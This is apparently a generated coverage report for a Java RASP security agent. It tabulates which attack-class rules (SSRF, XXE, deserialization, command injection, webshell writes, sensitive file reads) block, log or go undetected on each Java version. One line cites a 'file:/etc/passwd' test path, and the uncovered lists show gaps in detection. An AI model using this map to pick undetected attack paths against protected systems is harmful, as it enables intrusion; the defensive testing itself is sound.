# Rule cases

> **Generated** by `java-agent/scripts/gen-rule-cases.py` from `java-agent/rules/cases/*.toml`; do not edit.
> `--check` fails `scripts/check-docs.py` when this file is stale.

Each case is one input, the path that carries it into the agent, and what each engine does with it
today: the primary agent (JDK 21 and 25) and the backport agents (Java 8, 11 and 17). The
`rule-cases` probe runs every case on every agent line and fails when an engine does something
else. How to run and add cases: [java-agent/AGENTS.md](../AGENTS.md#rules).

Effects: **block** the agent stopped the operation and its event says block; **log** an event
names the rule and the operation ran; **none** no event and the operation ran; **unreachable**
this path cannot reach a rule for this input on that engine.

## Case files

One file per rule id. Effects count the file's attack cases; rules are the ids those cases name.

| Case file | Attack | Benign | Primary effects | Primary rules | Backport effects | Backport rules |
|---|---:|---:|---|---|---|---|
| [archive_traversal](../rules/cases/archive_traversal.toml) | 2 | 1 | block 1, log 1 | `archive_traversal` | block 2 | `archive_entry_traversal_write` |
| [base64_avx512_tail_underflow](../rules/cases/base64_avx512_tail_underflow.toml) | 2 | 1 | block 2 | `base64_avx512_tail_underflow` | block 2 | `base64_avx512_tail_underflow` |
| [classloader_remote](../rules/cases/classloader_remote.toml) | 2 | 1 | block 1, log 1 | `classloader_remote` | block 2 | `classloader_remote_codebase` |
| [command_common](../rules/cases/command_common.toml) | 4 | 2 | block 1, log 3 | `command_common` | block 4 | `command_execution_exploit_primitive` |
| [command_dnslog](../rules/cases/command_dnslog.toml) | 2 | 1 | block 1, log 1 | `command_dnslog` | unreachable 2 | - |
| [command_error](../rules/cases/command_error.toml) | 2 | 1 | block 1, log 1 | `command_error` | unreachable 2 | - |
| [command_userinput](../rules/cases/command_userinput.toml) | 8 | 2 | block 6, none 2 | `command_userinput` | block 6, none 2 | `command_execution_shell_meta` |
| [deleteFile_userinput](../rules/cases/deleteFile_userinput.toml) | 3 | 1 | block 2, none 1 | `deleteFile_userinput` | block 2, none 1 | `deleteFile_userinput` |
| [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml) | 4 | 1 | block 1, log 2, none 1 | `deserialization_blacklist` | block 3, none 1 | `deserialization_gadget_class` |
| [deserialization_gadget](../rules/cases/deserialization_gadget.toml) | 2 | 1 | block 1, log 1 | `deserialization_gadget` | block 2 | `deserialization_gadget_class` |
| [directory_userinput](../rules/cases/directory_userinput.toml) | 5 | 1 | block 3, none 2 | `directory_userinput` | block 3, none 2 | `directory_userinput` |
| [file_generated_plot_script_command](../rules/cases/file_generated_plot_script_command.toml) | 2 | 1 | unreachable 2 | - | block 2 | `file_generated_plot_script_command` |
| [java_compile_runtime](../rules/cases/java_compile_runtime.toml) | 5 | 1 | block 4, none 1 | `java_compile_runtime` | block 5 | `java_compile_runtime_execution` |
| [jdbc_derby_code_loading](../rules/cases/jdbc_derby_code_loading.toml) | 2 | 1 | unreachable 2 | - | block 2 | `jdbc_derby_code_loading` |
| [jdbc_h2_init](../rules/cases/jdbc_h2_init.toml) | 2 | 1 | block 1, log 1 | `jdbc_h2_init` | block 2 | `jdbc_h2_code_execution` |
| [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) | 3 | 1 | block 1, none 2 | `jdbc_mysql_deserialization` | block 3 | `jdbc_mysql_deserialization` |
| [jndi_disable_all](../rules/cases/jndi_disable_all.toml) | 3 | 1 | block 1, log 2 | `jndi_disable_all` | block 3 | `jndi_remote_lookup` |
| [readFile_unwanted](../rules/cases/readFile_unwanted.toml) | 3 | 1 | block 1, none 2 | `readFile_unwanted` | block 3 | `file_sensitive_read` |
| [readFile_userinput](../rules/cases/readFile_userinput.toml) | 3 | 2 | block 3 | `readFile_userinput` | block 3 | `file_sensitive_read` |
| [request_debug_process_launch](../rules/cases/request_debug_process_launch.toml) | 2 | 1 | block 2 | `request_debug_process_launch` | block 2 | `request_debug_process_launch` |
| [request_default_credential](../rules/cases/request_default_credential.toml) | 1 | 1 | block 1 | `request_default_credential` | unreachable 1 | - |
| [request_default_crypto_cookie](../rules/cases/request_default_crypto_cookie.toml) | 1 | 1 | block 1 | `request_default_crypto_cookie` | block 1 | `request_default_crypto_cookie` |
| [request_default_jwt_secret](../rules/cases/request_default_jwt_secret.toml) | 1 | 1 | block 1 | `request_default_jwt_secret` | block 1 | `request_default_jwt_secret` |
| [request_dynamic_script_config](../rules/cases/request_dynamic_script_config.toml) | 2 | 1 | block 2 | `request_dynamic_script_config` | unreachable 2 | - |
| [request_empty_credential_bypass](../rules/cases/request_empty_credential_bypass.toml) | 1 | 1 | block 1 | `request_empty_credential_bypass` | unreachable 1 | - |
| [request_expression_header](../rules/cases/request_expression_header.toml) | 1 | 1 | block 1 | `request_expression_header` | unreachable 1 | - |
| [request_expression_parameter](../rules/cases/request_expression_parameter.toml) | 2 | 1 | block 2 | `request_expression_parameter` | unreachable 2 | - |
| [request_expression_parameter_name](../rules/cases/request_expression_parameter_name.toml) | 1 | 1 | block 1 | `request_expression_parameter_name` | unreachable 1 | - |
| [request_expression_path](../rules/cases/request_expression_path.toml) | 1 | 1 | block 1 | `request_expression_path` | unreachable 1 | - |
| [request_forged_include_attribute](../rules/cases/request_forged_include_attribute.toml) | 1 | 1 | block 1 | `request_forged_include_attribute` | block 1 | `request_forged_include_attribute` |
| [request_internal_forward](../rules/cases/request_internal_forward.toml) | 1 | 1 | block 1 | `request_internal_forward` | block 1 | `request_internal_forward` |
| [request_internal_identity](../rules/cases/request_internal_identity.toml) | 1 | 1 | block 1 | `request_internal_identity` | block 1 | `request_internal_identity` |
| [request_internal_resource](../rules/cases/request_internal_resource.toml) | 2 | 1 | block 2 | `request_internal_resource` | block 1, none 1 | `request_path_confusion` |
| [request_java_bean_pollution](../rules/cases/request_java_bean_pollution.toml) | 1 | 1 | block 1 | `request_java_bean_pollution` | unreachable 1 | - |
| [request_jndi_lookup](../rules/cases/request_jndi_lookup.toml) | 2 | 1 | block 2 | `request_jndi_lookup` | unreachable 2 | - |
| [request_json_patch_expression](../rules/cases/request_json_patch_expression.toml) | 4 | 2 | block 3, none 1 | `request_json_patch_expression` | unreachable 4 | - |
| [request_message_selector_expression](../rules/cases/request_message_selector_expression.toml) | 2 | 1 | block 2 | `request_message_selector_expression` | unreachable 2 | - |
| [request_ogc_filter_sql_injection](../rules/cases/request_ogc_filter_sql_injection.toml) | 1 | 1 | block 1 | `request_ogc_filter_sql_injection` | block 1 | `request_ogc_filter_sql_injection` |
| [request_path_confusion](../rules/cases/request_path_confusion.toml) | 2 | 1 | block 2 | `request_path_confusion` | block 2 | `request_path_confusion` |
| [request_plot_command_injection](../rules/cases/request_plot_command_injection.toml) | 1 | 1 | block 1 | `request_plot_command_injection` | unreachable 1 | - |
| [request_remote_content_stream](../rules/cases/request_remote_content_stream.toml) | 1 | 1 | block 1 | `request_remote_content_stream` | unreachable 1 | - |
| [request_remote_import_script_write](../rules/cases/request_remote_import_script_write.toml) | 1 | 1 | block 1 | `request_remote_import_script_write` | unreachable 1 | - |
| [request_repository_webroot_write](../rules/cases/request_repository_webroot_write.toml) | 1 | 1 | block 1 | `request_repository_webroot_write` | unreachable 1 | - |
| [request_scheduler_shell_job](../rules/cases/request_scheduler_shell_job.toml) | 2 | 1 | block 2 | `request_scheduler_shell_job` | unreachable 2 | - |
| [request_serialized_client_state](../rules/cases/request_serialized_client_state.toml) | 1 | 1 | block 1 | `request_serialized_client_state` | unreachable 1 | - |
| [request_server_side_script_put](../rules/cases/request_server_side_script_put.toml) | 1 | 1 | block 1 | `request_server_side_script_put` | unreachable 1 | - |
| [request_session_file_deserialization](../rules/cases/request_session_file_deserialization.toml) | 1 | 1 | unreachable 1 | - | block 1 | `request_session_file_deserialization` |
| [request_setup_state_reset](../rules/cases/request_setup_state_reset.toml) | 1 | 1 | block 1 | `request_setup_state_reset` | unreachable 1 | - |
| [request_template_loader_enable](../rules/cases/request_template_loader_enable.toml) | 2 | 1 | block 2 | `request_template_loader_enable` | unreachable 2 | - |
| [request_template_parameter](../rules/cases/request_template_parameter.toml) | 2 | 1 | block 2 | `request_template_parameter` | unreachable 2 | - |
| [request_template_source](../rules/cases/request_template_source.toml) | 2 | 1 | block 2 | `request_template_source` | block 1, none 1 | `request_template_source` |
| [request_typed_parameter_deserialization](../rules/cases/request_typed_parameter_deserialization.toml) | 1 | 1 | block 1 | `request_typed_parameter_deserialization` | unreachable 1 | - |
| [request_typed_payload_deserialization](../rules/cases/request_typed_payload_deserialization.toml) | 2 | 1 | block 2 | `request_typed_payload_deserialization` | block 2 | `request_typed_payload_deserialization` |
| [request_upload_filename_override](../rules/cases/request_upload_filename_override.toml) | 1 | 1 | block 1 | `request_upload_filename_override` | unreachable 1 | - |
| [request_xml_polymorphic_gadget](../rules/cases/request_xml_polymorphic_gadget.toml) | 2 | 2 | block 2 | `request_xml_polymorphic_gadget` | unreachable 2 | - |
| [request_xxe_payload](../rules/cases/request_xxe_payload.toml) | 2 | 1 | block 2 | `request_xxe_payload` | unreachable 2 | - |
| [sql_derby_code_execution](../rules/cases/sql_derby_code_execution.toml) | 2 | 1 | block 1, none 1 | `sql_derby_code_execution` | unreachable 2 | - |
| [sql_h2_code_execution](../rules/cases/sql_h2_code_execution.toml) | 2 | 1 | block 2 | `sql_h2_code_execution` | unreachable 2 | - |
| [sql_policy](../rules/cases/sql_policy.toml) | 2 | 1 | block 2 | `sql_policy` | block 2 | `sql_statement_injection` |
| [sql_userinput](../rules/cases/sql_userinput.toml) | 2 | 1 | block 2 | `sql_userinput`, `sql_policy` | block 2 | `sql_statement_injection` |
| [ssrf_aws](../rules/cases/ssrf_aws.toml) | 2 | 1 | block 1, log 1 | `ssrf_aws` | block 2 | `ssrf_cloud_metadata` |
| [ssrf_common](../rules/cases/ssrf_common.toml) | 2 | 1 | block 1, log 1 | `ssrf_common` | unreachable 2 | - |
| [ssrf_obfuscate](../rules/cases/ssrf_obfuscate.toml) | 2 | 1 | block 1, log 1 | `ssrf_obfuscate` | unreachable 2 | - |
| [ssrf_protocol](../rules/cases/ssrf_protocol.toml) | 2 | 1 | block 1, log 1 | `ssrf_protocol` | unreachable 2 | - |
| [ssrf_userinput](../rules/cases/ssrf_userinput.toml) | 4 | 2 | block 4 | `ssrf_userinput` | block 4 | `ssrf_loopback_admin`, `ssrf_request_parameter_url` |
| [writeFile_generated_script](../rules/cases/writeFile_generated_script.toml) | 3 | 1 | block 2, none 1 | `writeFile_generated_script` | none 2, unreachable 1 | - |
| [writeFile_reflect](../rules/cases/writeFile_reflect.toml) | 2 | 1 | block 1, log 1 | `writeFile_reflect` | block 2 | `file_script_write` |
| [writeFile_script](../rules/cases/writeFile_script.toml) | 3 | 1 | block 1, none 2 | `writeFile_script` | block 3 | `file_script_write` |
| [xml_decoder_runtime](../rules/cases/xml_decoder_runtime.toml) | 2 | 1 | block 1, none 1 | `xml_decoder_runtime` | block 2 | `xml_decoder_runtime_execution` |
| [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) | 2 | 1 | block 1, none 1 | `xml_decoder_webshell` | block 2 | `xml_decoder_script_file_write` |
| [xpath_runtime](../rules/cases/xpath_runtime.toml) | 2 | 1 | block 1, log 1 | `xpath_runtime` | unreachable 2 | - |
| [xxe_file](../rules/cases/xxe_file.toml) | 2 | 1 | block 1, log 1 | `xxe_file`, `xxe_protocol` | block 2 | `xxe_external_entity_protocol` |
| [xxe_protocol](../rules/cases/xxe_protocol.toml) | 3 | 1 | block 1, log 2 | `xxe_protocol` | block 3 | `xxe_external_entity_protocol` |

## Primary rule ids

Each id that some case names on this engine: the attack cases that name it, the benign cases in the same files, and the effects those attack cases declare.

| Rule id | Attack cases | Benign cases | Declared effects | Case files |
|---|---:|---:|---|---|
| `archive_traversal` | 2 | 1 | block 1, log 1 | [archive_traversal](../rules/cases/archive_traversal.toml) |
| `base64_avx512_tail_underflow` | 2 | 1 | block 2 | [base64_avx512_tail_underflow](../rules/cases/base64_avx512_tail_underflow.toml) |
| `classloader_remote` | 2 | 1 | block 1, log 1 | [classloader_remote](../rules/cases/classloader_remote.toml) |
| `command_common` | 4 | 2 | block 1, log 3 | [command_common](../rules/cases/command_common.toml) |
| `command_dnslog` | 2 | 1 | block 1, log 1 | [command_dnslog](../rules/cases/command_dnslog.toml) |
| `command_error` | 2 | 1 | block 1, log 1 | [command_error](../rules/cases/command_error.toml) |
| `command_userinput` | 6 | 2 | block 6 | [command_userinput](../rules/cases/command_userinput.toml) |
| `deleteFile_userinput` | 2 | 1 | block 2 | [deleteFile_userinput](../rules/cases/deleteFile_userinput.toml) |
| `deserialization_blacklist` | 3 | 1 | block 1, log 2 | [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml) |
| `deserialization_gadget` | 2 | 1 | block 1, log 1 | [deserialization_gadget](../rules/cases/deserialization_gadget.toml) |
| `directory_userinput` | 3 | 1 | block 3 | [directory_userinput](../rules/cases/directory_userinput.toml) |
| `java_compile_runtime` | 4 | 1 | block 4 | [java_compile_runtime](../rules/cases/java_compile_runtime.toml) |
| `jdbc_h2_init` | 2 | 1 | block 1, log 1 | [jdbc_h2_init](../rules/cases/jdbc_h2_init.toml) |
| `jdbc_mysql_deserialization` | 1 | 1 | block 1 | [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) |
| `jndi_disable_all` | 3 | 1 | block 1, log 2 | [jndi_disable_all](../rules/cases/jndi_disable_all.toml) |
| `readFile_unwanted` | 1 | 1 | block 1 | [readFile_unwanted](../rules/cases/readFile_unwanted.toml) |
| `readFile_userinput` | 3 | 2 | block 3 | [readFile_userinput](../rules/cases/readFile_userinput.toml) |
| `request_debug_process_launch` | 2 | 1 | block 2 | [request_debug_process_launch](../rules/cases/request_debug_process_launch.toml) |
| `request_default_credential` | 1 | 1 | block 1 | [request_default_credential](../rules/cases/request_default_credential.toml) |
| `request_default_crypto_cookie` | 1 | 1 | block 1 | [request_default_crypto_cookie](../rules/cases/request_default_crypto_cookie.toml) |
| `request_default_jwt_secret` | 1 | 1 | block 1 | [request_default_jwt_secret](../rules/cases/request_default_jwt_secret.toml) |
| `request_dynamic_script_config` | 2 | 1 | block 2 | [request_dynamic_script_config](../rules/cases/request_dynamic_script_config.toml) |
| `request_empty_credential_bypass` | 1 | 1 | block 1 | [request_empty_credential_bypass](../rules/cases/request_empty_credential_bypass.toml) |
| `request_expression_header` | 1 | 1 | block 1 | [request_expression_header](../rules/cases/request_expression_header.toml) |
| `request_expression_parameter` | 2 | 1 | block 2 | [request_expression_parameter](../rules/cases/request_expression_parameter.toml) |
| `request_expression_parameter_name` | 1 | 1 | block 1 | [request_expression_parameter_name](../rules/cases/request_expression_parameter_name.toml) |
| `request_expression_path` | 1 | 1 | block 1 | [request_expression_path](../rules/cases/request_expression_path.toml) |
| `request_forged_include_attribute` | 1 | 1 | block 1 | [request_forged_include_attribute](../rules/cases/request_forged_include_attribute.toml) |
| `request_internal_forward` | 1 | 1 | block 1 | [request_internal_forward](../rules/cases/request_internal_forward.toml) |
| `request_internal_identity` | 1 | 1 | block 1 | [request_internal_identity](../rules/cases/request_internal_identity.toml) |
| `request_internal_resource` | 2 | 1 | block 2 | [request_internal_resource](../rules/cases/request_internal_resource.toml) |
| `request_java_bean_pollution` | 1 | 1 | block 1 | [request_java_bean_pollution](../rules/cases/request_java_bean_pollution.toml) |
| `request_jndi_lookup` | 2 | 1 | block 2 | [request_jndi_lookup](../rules/cases/request_jndi_lookup.toml) |
| `request_json_patch_expression` | 3 | 2 | block 3 | [request_json_patch_expression](../rules/cases/request_json_patch_expression.toml) |
| `request_message_selector_expression` | 2 | 1 | block 2 | [request_message_selector_expression](../rules/cases/request_message_selector_expression.toml) |
| `request_ogc_filter_sql_injection` | 1 | 1 | block 1 | [request_ogc_filter_sql_injection](../rules/cases/request_ogc_filter_sql_injection.toml) |
| `request_path_confusion` | 2 | 1 | block 2 | [request_path_confusion](../rules/cases/request_path_confusion.toml) |
| `request_plot_command_injection` | 1 | 1 | block 1 | [request_plot_command_injection](../rules/cases/request_plot_command_injection.toml) |
| `request_remote_content_stream` | 1 | 1 | block 1 | [request_remote_content_stream](../rules/cases/request_remote_content_stream.toml) |
| `request_remote_import_script_write` | 1 | 1 | block 1 | [request_remote_import_script_write](../rules/cases/request_remote_import_script_write.toml) |
| `request_repository_webroot_write` | 1 | 1 | block 1 | [request_repository_webroot_write](../rules/cases/request_repository_webroot_write.toml) |
| `request_scheduler_shell_job` | 2 | 1 | block 2 | [request_scheduler_shell_job](../rules/cases/request_scheduler_shell_job.toml) |
| `request_serialized_client_state` | 1 | 1 | block 1 | [request_serialized_client_state](../rules/cases/request_serialized_client_state.toml) |
| `request_server_side_script_put` | 1 | 1 | block 1 | [request_server_side_script_put](../rules/cases/request_server_side_script_put.toml) |
| `request_setup_state_reset` | 1 | 1 | block 1 | [request_setup_state_reset](../rules/cases/request_setup_state_reset.toml) |
| `request_template_loader_enable` | 2 | 1 | block 2 | [request_template_loader_enable](../rules/cases/request_template_loader_enable.toml) |
| `request_template_parameter` | 2 | 1 | block 2 | [request_template_parameter](../rules/cases/request_template_parameter.toml) |
| `request_template_source` | 2 | 1 | block 2 | [request_template_source](../rules/cases/request_template_source.toml) |
| `request_typed_parameter_deserialization` | 1 | 1 | block 1 | [request_typed_parameter_deserialization](../rules/cases/request_typed_parameter_deserialization.toml) |
| `request_typed_payload_deserialization` | 2 | 1 | block 2 | [request_typed_payload_deserialization](../rules/cases/request_typed_payload_deserialization.toml) |
| `request_upload_filename_override` | 1 | 1 | block 1 | [request_upload_filename_override](../rules/cases/request_upload_filename_override.toml) |
| `request_xml_polymorphic_gadget` | 2 | 2 | block 2 | [request_xml_polymorphic_gadget](../rules/cases/request_xml_polymorphic_gadget.toml) |
| `request_xxe_payload` | 2 | 1 | block 2 | [request_xxe_payload](../rules/cases/request_xxe_payload.toml) |
| `sql_derby_code_execution` | 1 | 1 | block 1 | [sql_derby_code_execution](../rules/cases/sql_derby_code_execution.toml) |
| `sql_h2_code_execution` | 2 | 1 | block 2 | [sql_h2_code_execution](../rules/cases/sql_h2_code_execution.toml) |
| `sql_policy` | 3 | 2 | block 3 | [sql_policy](../rules/cases/sql_policy.toml), [sql_userinput](../rules/cases/sql_userinput.toml) |
| `sql_userinput` | 1 | 1 | block 1 | [sql_userinput](../rules/cases/sql_userinput.toml) |
| `ssrf_aws` | 2 | 1 | block 1, log 1 | [ssrf_aws](../rules/cases/ssrf_aws.toml) |
| `ssrf_common` | 2 | 1 | block 1, log 1 | [ssrf_common](../rules/cases/ssrf_common.toml) |
| `ssrf_obfuscate` | 2 | 1 | block 1, log 1 | [ssrf_obfuscate](../rules/cases/ssrf_obfuscate.toml) |
| `ssrf_protocol` | 2 | 1 | block 1, log 1 | [ssrf_protocol](../rules/cases/ssrf_protocol.toml) |
| `ssrf_userinput` | 4 | 2 | block 4 | [ssrf_userinput](../rules/cases/ssrf_userinput.toml) |
| `writeFile_generated_script` | 2 | 1 | block 2 | [writeFile_generated_script](../rules/cases/writeFile_generated_script.toml) |
| `writeFile_reflect` | 2 | 1 | block 1, log 1 | [writeFile_reflect](../rules/cases/writeFile_reflect.toml) |
| `writeFile_script` | 1 | 1 | block 1 | [writeFile_script](../rules/cases/writeFile_script.toml) |
| `xml_decoder_runtime` | 1 | 1 | block 1 | [xml_decoder_runtime](../rules/cases/xml_decoder_runtime.toml) |
| `xml_decoder_webshell` | 1 | 1 | block 1 | [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) |
| `xpath_runtime` | 2 | 1 | block 1, log 1 | [xpath_runtime](../rules/cases/xpath_runtime.toml) |
| `xxe_file` | 1 | 1 | log 1 | [xxe_file](../rules/cases/xxe_file.toml) |
| `xxe_protocol` | 5 | 2 | block 2, log 2, log (also) 1 | [xxe_file](../rules/cases/xxe_file.toml), [xxe_protocol](../rules/cases/xxe_protocol.toml) |

Not covered on this engine, from [uncovered.toml](../rules/cases/uncovered.toml) and, for the ids marked `not wired`, from the `not_wired` object of the [catalogue](../rules/general.json):

- selected only by a loaded policy; the cases run with no policy: `command_reflect`, `deserialization_http_object_stream`, `directory_reflect`, `directory_unwanted`, `readFile_outsideWebroot`, `request_scanner`, `request_sql_identifier_injection`, `request_sql_sort_injection`, `xss_userinput`
- decided from a Windows named data stream path and selected only by a loaded policy; the probes run on Linux with no policy: `writeFile_NTFS`
- needs an expression engine on the driver's class path (EL, JEXL, Jiffle, OGNL, Groovy or MVEL, Spring Expression, Velocity); the JDK ships none of them: `el_runtime`, `jexl_runtime`, `jiffle_runtime`, `ognl_blacklist`, `ognl_length_limit`, `script_runtime`, `spel_runtime`, `template_runtime`
- needs Rhino or a standalone Nashorn on the driver's class path; JDK 21 and 25 ship no JavaScript engine: `javascript_runtime`
- decided from the frames of a specific product on the stack (RocketMQ filter server, Solr RunExecutableListener, Spring bean init, RocketMQ configuration persistence); needs that product's classes: `command_config_injection`, `command_config_listener`, `command_spring_remote_init`, `writeFile_config_path`
- decided from the frames of a deserializing transport on the stack (cluster messaging, JMS ObjectMessage, logging socket server, WebLogic-style remoting, signed-object remoting, Spring Web Flow state); needs that transport: `deserialization_cluster_message`, `deserialization_jms_object_message`, `deserialization_logging_message`, `deserialization_remoting_transport`, `deserialization_signed_object`, `deserialization_webflow_state`
- needs a third-party library on the driver's class path whose classes the hook instruments (fastjson, Hessian, a polymorphic JSON or XML binder, ActiveMQ OpenWire, Apache XML-RPC, Spring remoting or Spring context, args4j, MyBatis, Spark or YARN, DataEase): `deserialization_fastjson_resource_url`, `deserialization_hessian_type`, `deserialization_http_invoker`, `deserialization_polymorphic_type`, `deserialization_protocol_class`, `deserialization_xmlrpc_serialized`, `readFile_argument_expansion`, `request_jwt_verification_failure`, `request_remote_job_submission`, `spring_remote_config`, `sql_identifier_injection`
- decided when a servlet container loads a stored session; the stub request path has no session store: `deserialization_session_file`
- decided from a multipart part's file name; the driver's stub request carries no multipart parts yet: `fileUpload_java_archive`, `fileUpload_multipart_exe`, `fileUpload_multipart_expression`, `fileUpload_multipart_html`, `fileUpload_multipart_script`, `fileUpload_path_traversal`
- reachable with JDK classes, no case yet: needs an RMI registry on loopback and a bind or call through it, so the sun.rmi transport frames are on the stack: `deserialization_rmi_registry_bind`, `deserialization_rmi_transport`
- reachable with JDK classes, no case yet: needs a JAAS login configuration that names JndiLoginModule, and the per-rule switch the hook checks: `jndi_jaas_config`
- reachable with JDK classes, no case yet: needs an MBean whose operation the rule lists, invoked through the platform MBean server inside a request: `jmx_file_write`, `jmx_remote_config`
- a host lookup the agent lets through outside a request would query DNS off the machine, and the probes send nothing off the machine: `dns_blacklist`
- not triggered by a protocol-shaped path (file:/etc/passwd, http:/host/x) that a request parameter selects and FileInputStream opens (measured: no event on either engine); the read API that carries the protocol to this rule was not identified: `readFile_userinput_http`, `readFile_userinput_unwanted`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeEval; only the playground servlet calls it: `eval_regex`
- not wired: OhMyRaspHooks.beforeExpressionEvaluation reports it only for an engine name that has no id of its own, and every engine name ExpressionHookModule passes has one: `expression_runtime`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeWebdavUpload; only the playground servlet calls it: `fileUpload_webdav`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeInclude; only the playground servlet calls it: `include_protocol`, `include_userinput`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeLink; only the playground servlet calls it: `link_webshell`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeLoadLibrary; only the playground servlet calls it: `loadLibrary_unc`
- not wired: No code emits it: the OGNL path (CodeExecutionDetector.detectOgnl) reports ognl_blacklist or ognl_length_limit: `ognl_runtime`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeRename; only the playground servlet calls it: `rename_webshell`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeResponseDataLeak; only the playground servlet and the servlet-admission probe's stub servlet call it: `response_dataLeak`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeSqlException; only the playground servlet calls it: `sql_exception`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeSqlRegex; only the playground servlet calls it: `sql_regex`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeWebshellCallable; only the playground servlet calls it: `webshell_callable`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeWebshellCommand; only the playground servlet calls it: `webshell_command`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeWebshellEval; only the playground servlet calls it: `webshell_eval`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeWebshellFileWrite; only the playground servlet calls it: `webshell_file_put_contents`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeWebshellLdPreload; only the playground servlet calls it: `webshell_ld_preload`
- not wired: No hook module injects a call to OhMyRaspHooks.beforeXssEcho; only the playground servlet and the servlet-admission probe's stub servlet call it: `xss_echo`

## Backport rule families (without the line prefix)

Each id that some case names on this engine: the attack cases that name it, the benign cases in the same files, and the effects those attack cases declare.

| Rule id | Attack cases | Benign cases | Declared effects | Case files |
|---|---:|---:|---|---|
| `archive_entry_traversal_write` | 2 | 1 | block 2 | [archive_traversal](../rules/cases/archive_traversal.toml) |
| `base64_avx512_tail_underflow` | 2 | 1 | block 2 | [base64_avx512_tail_underflow](../rules/cases/base64_avx512_tail_underflow.toml) |
| `classloader_remote_codebase` | 2 | 1 | block 2 | [classloader_remote](../rules/cases/classloader_remote.toml) |
| `command_execution_exploit_primitive` | 4 | 2 | block 4 | [command_common](../rules/cases/command_common.toml) |
| `command_execution_shell_meta` | 6 | 2 | block 6 | [command_userinput](../rules/cases/command_userinput.toml) |
| `deleteFile_userinput` | 2 | 1 | block 2 | [deleteFile_userinput](../rules/cases/deleteFile_userinput.toml) |
| `deserialization_gadget_class` | 5 | 2 | block 5 | [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml), [deserialization_gadget](../rules/cases/deserialization_gadget.toml) |
| `directory_userinput` | 3 | 1 | block 3 | [directory_userinput](../rules/cases/directory_userinput.toml) |
| `file_generated_plot_script_command` | 2 | 1 | block 2 | [file_generated_plot_script_command](../rules/cases/file_generated_plot_script_command.toml) |
| `file_script_write` | 5 | 2 | block 5 | [writeFile_reflect](../rules/cases/writeFile_reflect.toml), [writeFile_script](../rules/cases/writeFile_script.toml) |
| `file_sensitive_read` | 6 | 3 | block 6 | [readFile_unwanted](../rules/cases/readFile_unwanted.toml), [readFile_userinput](../rules/cases/readFile_userinput.toml) |
| `java_compile_runtime_execution` | 5 | 1 | block 5 | [java_compile_runtime](../rules/cases/java_compile_runtime.toml) |
| `jdbc_derby_code_loading` | 2 | 1 | block 2 | [jdbc_derby_code_loading](../rules/cases/jdbc_derby_code_loading.toml) |
| `jdbc_h2_code_execution` | 2 | 1 | block 2 | [jdbc_h2_init](../rules/cases/jdbc_h2_init.toml) |
| `jdbc_mysql_deserialization` | 3 | 1 | block 3 | [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) |
| `jndi_remote_lookup` | 3 | 1 | block 3 | [jndi_disable_all](../rules/cases/jndi_disable_all.toml) |
| `request_debug_process_launch` | 2 | 1 | block 2 | [request_debug_process_launch](../rules/cases/request_debug_process_launch.toml) |
| `request_default_crypto_cookie` | 1 | 1 | block 1 | [request_default_crypto_cookie](../rules/cases/request_default_crypto_cookie.toml) |
| `request_default_jwt_secret` | 1 | 1 | block 1 | [request_default_jwt_secret](../rules/cases/request_default_jwt_secret.toml) |
| `request_forged_include_attribute` | 1 | 1 | block 1 | [request_forged_include_attribute](../rules/cases/request_forged_include_attribute.toml) |
| `request_internal_forward` | 1 | 1 | block 1 | [request_internal_forward](../rules/cases/request_internal_forward.toml) |
| `request_internal_identity` | 1 | 1 | block 1 | [request_internal_identity](../rules/cases/request_internal_identity.toml) |
| `request_ogc_filter_sql_injection` | 1 | 1 | block 1 | [request_ogc_filter_sql_injection](../rules/cases/request_ogc_filter_sql_injection.toml) |
| `request_path_confusion` | 3 | 2 | block 3 | [request_internal_resource](../rules/cases/request_internal_resource.toml), [request_path_confusion](../rules/cases/request_path_confusion.toml) |
| `request_session_file_deserialization` | 1 | 1 | block 1 | [request_session_file_deserialization](../rules/cases/request_session_file_deserialization.toml) |
| `request_template_source` | 1 | 1 | block 1 | [request_template_source](../rules/cases/request_template_source.toml) |
| `request_typed_payload_deserialization` | 2 | 1 | block 2 | [request_typed_payload_deserialization](../rules/cases/request_typed_payload_deserialization.toml) |
| `sql_statement_injection` | 4 | 2 | block 4 | [sql_policy](../rules/cases/sql_policy.toml), [sql_userinput](../rules/cases/sql_userinput.toml) |
| `ssrf_cloud_metadata` | 2 | 1 | block 2 | [ssrf_aws](../rules/cases/ssrf_aws.toml) |
| `ssrf_loopback_admin` | 2 | 2 | block 2 | [ssrf_userinput](../rules/cases/ssrf_userinput.toml) |
| `ssrf_request_parameter_url` | 2 | 2 | block 2 | [ssrf_userinput](../rules/cases/ssrf_userinput.toml) |
| `xml_decoder_runtime_execution` | 2 | 1 | block 2 | [xml_decoder_runtime](../rules/cases/xml_decoder_runtime.toml) |
| `xml_decoder_script_file_write` | 2 | 1 | block 2 | [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) |
| `xxe_external_entity_protocol` | 5 | 2 | block 5 | [xxe_file](../rules/cases/xxe_file.toml), [xxe_protocol](../rules/cases/xxe_protocol.toml) |

Not covered on this engine, from [uncovered.toml](../rules/cases/uncovered.toml) and, for the ids marked `not wired`, from the `not_wired` object of the [catalogue](../rules/general.json):

- decided from a multipart part's file name; the driver's stub request carries no multipart parts yet: `fileUpload_java_archive`, `fileUpload_multipart_exe`, `fileUpload_multipart_expression`, `fileUpload_multipart_html`, `fileUpload_multipart_script`, `fileUpload_path_traversal`
